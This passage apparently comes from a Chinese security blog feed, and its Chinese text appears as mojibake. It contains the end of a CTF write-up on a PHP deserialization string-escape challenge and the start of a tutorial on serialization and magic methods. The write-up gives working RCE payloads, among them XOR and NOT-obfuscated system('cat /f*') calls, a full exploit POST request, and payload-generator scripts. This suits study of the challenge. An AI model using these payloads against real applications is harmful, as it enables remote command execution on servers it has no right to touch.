class="variable">$x</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">push_it</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$root</span>=<span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$pwd</span>=<span class="string">&#x27;qwe&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">push_it</span>();</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;    </span><br><span class="line"><span class="comment">//O:7:&quot;push_it&quot;:2:&#123;s:13:&quot;%00push_it%00root&quot;;s:4:&quot;root&quot;;s:12:&quot;%00push_it%00pwd&quot;;s:3:&quot;qwe&quot;;&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>O:7:â€push_itâ€:2:{s:13:â€%00push_it%00rootâ€;s:4:â€rootâ€;s:12:â€%00push_it%00pwdâ€;s:3:â€qweâ€;}æˆ‘ä»¬åˆ©ç”¨è¿™ä¸ªæ¥é€ƒé€¸</p><p>O:7:â€push_itâ€:2:{s:13:â€%00push_it%00rootâ€;s:4:â€root**â€;s:12:â€%00push_it%00pwdâ€;s:3:â€*<em>qweâ€;}å¯ä»¥åˆ©ç”¨çš„åŠ ç²—å­—ç¬¦æ•°ä¸€æ•°æœ‰28ä½ï¼Œæˆ‘ä»¬å°±ä¸€å…±è¦é€ƒé€¸28ä¸ªå­—ç¬¦ï¼Œaå‡½æ•°æ²¡æ‰§è¡Œä¸€æ¬¡ä¼šå¤š2ä½ï¼Œæ‰€ä»¥éœ€è¦é‡å¤14æ¬¡   14</em>6&#x3D;84ä¸ªb</p></blockquote><p>ç„¶åæˆ‘ä»¬è¦è¿›è¡Œæ„é€ pwdï¼Œpull_ité‡Œè¿‡æ»¤äº†è¶…å¤šï¼Œæ˜¯æ— å­—ç¬¦æ•°å­—rceï¼Œè¿™é‡Œç”¨åˆ°å–å</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pull_it</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$x</span>=<span class="string">&quot;(~&quot;</span>.~<span class="string">&quot;system&quot;</span>.<span class="string">&quot;)(~&quot;</span>.~<span class="string">&quot;cat /f*&quot;</span>.<span class="string">&quot;);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">pull_it</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">//O:7:&quot;pull_it&quot;:1:&#123;s:10:&quot; pull_it x&quot;;s:20:&quot;(~ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½)(~ï¿½ï¿½ï¿½ï¿½Ğ™ï¿½);&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬ç°åœ¨å·²ç»çŸ¥é“äº†pull_itåºåˆ—åŒ–åå­—ç¬¦ä¸²çš„å½¢å¼äº†ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬åªéœ€è¦é—­åˆpush_itåºåˆ—åŒ–å­—ç¬¦ä¸²å‰é¢çš„ç¬¦å·å³å¯ï¼š</p><p>å‰é¢é€ƒé€¸å‡ºæ¥çš„è¿™äº›å­—ç¬¦å·²ç»å˜æˆusernameä¸²ä¸­çš„ä¸€éƒ¨åˆ†äº†ï¼Œæˆ‘ä»¬åœ¨pwdä¸­ä¹Ÿéœ€è¦åŠ å…¥è¿™äº›è¿›è¡Œé—­åˆï¼ˆè¿™é‡Œçš„%00æˆ‘ä»¬ä¸èƒ½ç›´æ¥è¿™ä¹ˆå†™ï¼Œéœ€è¦ç¼–ç åæ‰ä¸º%00ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å…ˆå†™æˆ\000ï¼Œè¿™ä¸ªæ˜¯8è¿›åˆ¶çš„å†™æ³•ï¼Œç„¶åç¼–ç ä¹‹åå°±èƒ½è½¬ä¸º%00ï¼Œä½†æ˜¯åœ¨phpä¸­éœ€è¦ä½¿ç”¨åŒå¼•å·æ‰èƒ½è¯†åˆ«\000ï¼‰<br>â€œ;s:12:â€%00push_it%00pwdâ€;</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">pull_it</span> </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$x</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$xx</span></span>) </span>&#123;</span><br><span class="line">  <span class="variable language_">$this</span>-&gt;x = <span class="variable">$xx</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="string">&quot;\&quot;;s:12:\&quot;\000push_it\000pwd\&quot;;&quot;</span>.<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">pull_it</span>(<span class="string">&quot;(~&quot;</span>.~<span class="string">&quot;system&quot;</span>.<span class="string">&quot;)(~&quot;</span>.~<span class="string">&quot;cat /f*&quot;</span>.<span class="string">&quot;);&quot;</span>)));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root=bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&amp;pwd=%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A12%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>push_it%<span class="number">00</span>pwd%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>pull_it%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A10%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>pull_it%<span class="number">00</span>x%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A20%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">28</span>%<span class="number">7</span>E%<span class="number">8</span>C%<span class="number">86</span>%<span class="number">8</span>C%<span class="number">8</span>B%<span class="number">9</span>A%<span class="number">92</span>%<span class="number">29</span>%<span class="number">28</span>%<span class="number">7</span>E%<span class="number">9</span>C%<span class="number">9</span>E%<span class="number">8</span>B%DF%D0%<span class="number">99</span>%D5%<span class="number">29</span>%<span class="number">3</span>B%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2023/08/10/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%20unserialize%20%20wp/image/image-20230810191408215-1700990497600-318.png"></p><p><img src="/2023/08/10/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%20unserialize%20%20wp/image/image-20230810191445372-1700990497600-319.png"></p><p>å¤§ä½¬çš„åšæ³•ï¼š</p><p>åˆ©ç”¨è„šæœ¬æ„é€ å¼‚æˆ–çš„playloadï¼šï¼ˆæ–‡ç« æœ«å°¾é™„è„šæœ¬ï¼‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(&quot;%08%02%08%08%05%0d&quot;^&quot;%7b%7b%7b%7c%60%60&quot;)(&quot;%03%01%08%00%00%06%00&quot;^&quot;%60%60%7c%20%2f%60%2a&quot;);</span><br><span class="line"></span><br><span class="line">base64ä¸€ä¸‹</span><br><span class="line">KCIlMDglMDIlMDglMDglMDUlMGQiXiIlN2IlN2IlN2IlN2MlNjAlNjAiKSgiJTAzJTAxJTA4JTAwJTAwJTA2JTAwIl4iJTYwJTYwJTdjJTIwJTJmJTYwJTJhIik7</span><br></pre></td></tr></table></figure><p><img src="/2023/08/10/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%20unserialize%20%20wp/image/image-20230810175712493-1700990497600-320.png">ç”Ÿæˆååºåˆ—åŒ–å­—ç¬¦ä¸²</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pull_it</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$x</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$xx</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;x = <span class="variable">$xx</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>= <span class="keyword">new</span> <span class="title function_ invoke__">pull_it</span>(<span class="title function_ invoke__">urldecode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="string">&quot;KCIlMDglMDIlMDglMDglMDUlMGQiXiIlN2IlN2IlN2IlN2MlNjAlNjAiKSgiJTAzJTAxJTA4JTAwJTAwJTA2JTAwIl4iJTYwJTYwJTdjJTIwJTJmJTYwJTJhIik7&quot;</span>)));</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">//O%3A7%3A%22pull_it%22%3A1%3A%7Bs%3A10%3A%22%00pull_it%00x%22%3Bs%3A41%3A%22%28%22%08%02%08%08%05%0D%22%5E%22%7B%7B%7B%7C%60%60%22%29%28%22%03%01%08%00%00%06%00%22%5E%22%60%60%7C+%2F%60%2A%22%29%3B%22%3B%7D</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç„¶åé€ƒé€¸å­—ç¬¦ï¼Œé€ƒé€¸14ä¸ªå­—ç¬¦ï¼Œå¯ä»¥åœ¨pwdå‚æ•°ä½ç½®åœ¨æœ¬åœ°å¾®è°ƒ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST /index.php HTTP/1.1</span><br><span class="line">Host: web-898394c697.challenge.xctf.org.cn</span><br><span class="line">Content-Length: 313</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Cookie: PHPSESSID=52q1rf64lljie7ivi6tbte4hnb</span><br><span class="line"></span><br><span class="line">root=bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&amp;pwd=&quot;;s:5:&quot;datou&quot;;O%3A7%3A%22pull_it%22%3A1%3A%7Bs%3A10%3A%22%00pull_it%00x%22%3Bs%3A41%3A%22%28%22%08%02%08%08%05%0D%22%5E%22%7B%7B%7B%7C%60%60%22%29%28%22%03%01%08%00%00%06%00%22%5E%22%60%60%7C+%2F%60%2A%22%29%3B%22%3B%7D</span><br></pre></td></tr></table></figure><p>å†è®¿é—®login.phpæ‹¿flagï¼Œè®°å¾—å¸¦ä¸ŠSESSION</p><p>è„šæœ¬ï¼šå…ˆphpç”Ÿæˆæ–‡æœ¬ï¼Œå†py</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*author yu22x*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;xor_rce.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line"><span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$hex_i</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line"><span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$hex_j</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$preg</span> = <span class="string">&#x27;/[a-z0-9]/i&#x27;</span>; <span class="comment">//æ ¹æ®é¢˜ç›®ç»™çš„æ­£åˆ™è¡¨è¾¾å¼ä¿®æ”¹å³å¯</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line"><span class="variable">$c</span>=(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)^<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line"><span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>xor.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">arg</span>):</span><br><span class="line">   s1=<span class="string">&quot;&quot;</span></span><br><span class="line">   s2=<span class="string">&quot;&quot;</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">       f=<span class="built_in">open</span>(<span class="string">&quot;xor_rce.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">       <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">           t=f.readline()</span><br><span class="line">           <span class="keyword">if</span> t==<span class="string">&quot;&quot;</span>:</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">           <span class="keyword">if</span> t[<span class="number">0</span>]==i:</span><br><span class="line">               <span class="comment">#print(i)</span></span><br><span class="line">               s1+=t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">               s2+=t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">       f.close()</span><br><span class="line">   output=<span class="string">&quot;(\&quot;&quot;</span>+s1+<span class="string">&quot;\&quot;^\&quot;&quot;</span>+s2+<span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">   <span class="keyword">return</span>(output)</span><br><span class="line">   </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">   param=action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your functionï¼š&quot;</span>) )+action(<span class="built_in">input</span>(<span class="string">&quot;[+] your commandï¼š&quot;</span>))+<span class="string">&quot;;&quot;</span></span><br><span class="line">   <span class="built_in">print</span>(param)</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Phpååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸</title>
      <link href="/2023/08/03/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/"/>
      <url>/2023/08/03/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP-ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸"><a href="#PHP-ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸" class="headerlink" title="PHP ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸"></a>PHP ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸</h1><h3 id="ååºåˆ—åŒ–æ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#ååºåˆ—åŒ–æ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="ååºåˆ—åŒ–æ˜¯ä»€ä¹ˆï¼Ÿ"></a>ååºåˆ—åŒ–æ˜¯ä»€ä¹ˆï¼Ÿ</h3><p>PHPåºåˆ—åŒ–ï¼šserialize()</p><p>åºåˆ—åŒ–æ˜¯å°†å˜é‡æˆ–å¯¹è±¡è½¬æ¢æˆå­—ç¬¦ä¸²çš„è¿‡ç¨‹ï¼Œç”¨äºå­˜å‚¨æˆ–ä¼ é€’ PHP çš„å€¼çš„è¿‡ç¨‹ä¸­ï¼ŒåŒæ—¶ä¸ä¸¢å¤±å…¶ç±»å‹å’Œç»“æ„ã€‚</p><p>è€ŒPHPååºåˆ—åŒ–ï¼šunserialize()</p><p>ååºåˆ—åŒ–æ˜¯å°†å­—ç¬¦ä¸²è½¬æ¢æˆå˜é‡æˆ–å¯¹è±¡çš„è¿‡ç¨‹</p><p>é€šè¿‡åºåˆ—åŒ–ä¸ååºåˆ—åŒ–æˆ‘ä»¬å¯ä»¥å¾ˆæ–¹ä¾¿çš„åœ¨PHPä¸­è¿›è¡Œå¯¹è±¡çš„ä¼ é€’ã€‚æœ¬è´¨ä¸Šååºåˆ—åŒ–æ˜¯æ²¡æœ‰å±å®³çš„ã€‚ä½†æ˜¯å¦‚æœç”¨æˆ·å¯¹æ•°æ®å¯æ§é‚£å°±å¯ä»¥åˆ©ç”¨ååºåˆ—åŒ–æ„é€ payloadæ”»å‡»ã€‚è¿™æ ·è¯´å¯èƒ½è¿˜ä¸æ˜¯å¾ˆå…·ä½“ï¼Œä¸¾ä¸ªåˆ—å­æ¯”å¦‚ä½ ç½‘è´­ä¹°ä¸€ä¸ªæ¶å­ï¼Œå‘è´§ä¸ºèŠ‚çœæˆæœ¬ï¼Œæ˜¯æ‹†å¼€ç»™ä½ å‘è¿‡å»ï¼Œåˆ°ä½ æ‰‹ä¸Šï¼Œç„¶åç»™ä½ è¯´æ˜ä¹¦è®©ä½ ç»„è£…ï¼Œæ‹†å¼€ç»™ä½ è¿™ä¸ªè¿‡ç¨‹å¯ä»¥è¯´æ˜¯åºåˆ—åŒ–ï¼Œä½ ç»„è£…çš„è¿‡ç¨‹å°±æ˜¯ååºåˆ—åŒ–</p><p>è°ˆåˆ°phpååºåˆ—åŒ–ï¼Œæˆ‘ä»¬å…ˆæ¥çœ‹ä¸€ä¸‹PHPä»–çš„é¢å‘å¯¹è±¡æ€ä¹ˆä¸ªç†è§£ï¼Œ</p><p>é¢å‘è¿‡ç¨‹vsé¢å‘å¯¹è±¡</p><p><strong>é¢å‘è¿‡ç¨‹</strong><br>é¢å‘è¿‡ç¨‹æ˜¯ä¸€ç§ä»¥â€œæ•´ä½“äº‹ä»¶â€ä¸ºä¸­å¿ƒçš„ç¼–ç¨‹æ€æƒ³ï¼Œç¼–ç¨‹çš„æ—¶å€™æŠŠè§£å†³é—®é¢˜çš„æ­¥éª¤åˆ†æå‡ºæ¥ï¼Œç„¶åç”¨å‡½æ•°æŠŠè¿™äº›æ­¥éª¤å®ç°ï¼Œåœ¨ä¸€æ­¥ä¸€æ­¥çš„å…·ä½“æ­¥éª¤ä¸­å†æŒ‰é¡ºåºè°ƒç”¨å‡½æ•°ã€‚<br><strong>é¢å‘å¯¹è±¡</strong><br>é¢å‘å¯¹è±¡æ˜¯ä¸€ç§ä»¥â€œå¯¹è±¡â€ä¸ºä¸­å¿ƒçš„ç¼–ç¨‹æ€æƒ³ï¼ŒæŠŠè¦è§£å†³çš„é—®é¢˜åˆ†è§£æˆå„ä¸ªâ€œå¯¹è±¡â€;<br>å¯¹è±¡æ˜¯ä¸€ä¸ªç”±ä¿¡æ¯åŠå¯¹ä¿¡æ¯è¿›è¡Œå¤„ç†çš„æè¿°æ‰€ç»„æˆçš„æ•´ä½“ï¼Œæ˜¯å¯¹ç°å®ä¸–ç•Œçš„æŠ½è±¡ã€‚<br>å¯¹è±¡çš„ä¸‰ä¸ªç‰¹å¾:<strong>å¯¹è±¡çš„è¡Œä¸ºï¼Œå¯¹è±¡çš„å½¢æ€ï¼Œå¯¹è±¡çš„è¡¨ç¤º</strong></p><p>ç±»æ˜¯å®šä¹‰äº†ä¸€ä»¶äº‹ç‰©çš„æŠ½è±¡ç‰¹ç‚¹ï¼Œå®ƒå°†æ•°æ®çš„å½¢å¼ä»¥åŠè¿™äº›æ•°æ®ä¸Šçš„æ“ä½œå°è£…åœ¨ä¸€èµ·ã€‚<br>å¯¹è±¡æ˜¯å…·æœ‰ç±»ç±»å‹çš„å˜é‡ï¼Œæ˜¯å¯¹ç±»çš„å®ä¾‹ã€‚</p><p>å†…éƒ¨æ„æˆï¼šæˆå‘˜å˜é‡ï¼ˆå±æ€§ï¼‰+æˆå‘˜å‡½æ•°ï¼ˆæ–¹æ³•ï¼‰</p><h3 id="phpåºåˆ—åŒ–çš„å­—æ¯æ ‡è¯†"><a href="#phpåºåˆ—åŒ–çš„å­—æ¯æ ‡è¯†" class="headerlink" title="phpåºåˆ—åŒ–çš„å­—æ¯æ ‡è¯†"></a>phpåºåˆ—åŒ–çš„å­—æ¯æ ‡è¯†</h3><p>a - array</p><p>b - boolean</p><p>d - double</p><p>i - integer</p><p>o - common object</p><p>r - reference</p><p>s - string</p><p>C - custom object</p><p>O - class</p><p>N - null</p><p>R - pointer reference</p><p>U - unicode string</p><p>N - NULL</p><h3 id="é­”æœ¯æ–¹æ³•"><a href="#é­”æœ¯æ–¹æ³•" class="headerlink" title="é­”æœ¯æ–¹æ³•"></a>é­”æœ¯æ–¹æ³•</h3><p>__construct å½“ä¸€ä¸ªå¯¹è±¡åˆ›å»ºæ—¶è¢«è°ƒç”¨ï¼Œnew ä¸€ä¸ª</p><p>__destruct å½“ä¸€ä¸ªå¯¹è±¡é”€æ¯æ—¶è¢«è°ƒç”¨ï¼Œåºåˆ—åŒ–ä¸€ä¸ª</p><p>__toString å½“ä¸€ä¸ªå¯¹è±¡è¢«å½“ä½œä¸€ä¸ªå­—ç¬¦ä¸²è¢«è°ƒç”¨ã€‚</p><p>__wakeup() ä½¿ç”¨unserializeæ—¶è§¦å‘</p><p>__sleep() ä½¿ç”¨serializeæ—¶è§¦å‘</p><p>__destruct() å¯¹è±¡è¢«é”€æ¯æ—¶è§¦å‘</p><p>__call() å¯¹ä¸å­˜åœ¨çš„æ–¹æ³•æˆ–è€…ä¸å¯è®¿é—®çš„æ–¹æ³•è¿›è¡Œè°ƒç”¨å°±è‡ªåŠ¨è°ƒç”¨</p><p>__callStatic() åœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘</p><p>__get() ç”¨äºä»ä¸å¯è®¿é—®çš„å±æ€§è¯»å–æ•°æ®</p><p>__set() åœ¨ç»™ä¸å¯è®¿é—®çš„(protectedæˆ–è€…private)æˆ–è€…ä¸å­˜åœ¨çš„å±æ€§èµ‹å€¼çš„æ—¶å€™ï¼Œä¼šè¢«è°ƒç”¨</p><p>__isset() åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šè°ƒç”¨isset()æˆ–empty()è§¦å‘</p><p>__unset() åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šä½¿ç”¨unset()æ—¶è§¦å‘</p><p>__toString() æŠŠç±»å½“ä½œå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è§¦å‘,è¿”å›å€¼éœ€è¦ä¸ºå­—ç¬¦ä¸²</p><p>__invoke() å½“è„šæœ¬å°è¯•å°†å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘</p><p>æ³¨æ„ç‚¹ï¼šprivate protected å±æ€§ åºåˆ—åŒ–å‡ºæ¥ä¼šæœ‰ä¸å¯æ‰“å°å­—ç¬¦ï¼Œéœ€è¦urlç¼–ç ä¸€ä¸‹</p><h3 id="wakeupç»•è¿‡"><a href="#wakeupç»•è¿‡" class="headerlink" 